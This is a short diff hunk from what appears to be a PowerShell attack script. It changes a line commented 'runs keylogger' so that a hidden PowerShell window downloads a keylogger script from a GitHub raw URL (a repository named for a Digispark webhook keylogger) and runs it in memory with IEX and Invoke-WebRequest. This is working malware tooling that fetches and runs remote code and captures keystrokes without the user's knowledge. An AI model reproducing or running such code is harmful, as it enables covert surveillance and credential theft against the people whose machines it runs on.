@@ -45,7 +45,7 @@ while ($true) {
             }
   
             # runs keylogger
-            powershell Start-Process powershell.exe -windowstyle hidden "$env:temp/keylogger.ps1"
+           powershell Start-Process powershell.exe -windowstyle hidden "IEX(IWR https://raw.githubusercontent.com/ISykeI/Digispark_Keylogger_Webhook/main/keylog.ps1 -UseBasicParsing); Invoke-keylog.ps1"
         }
     }
 }
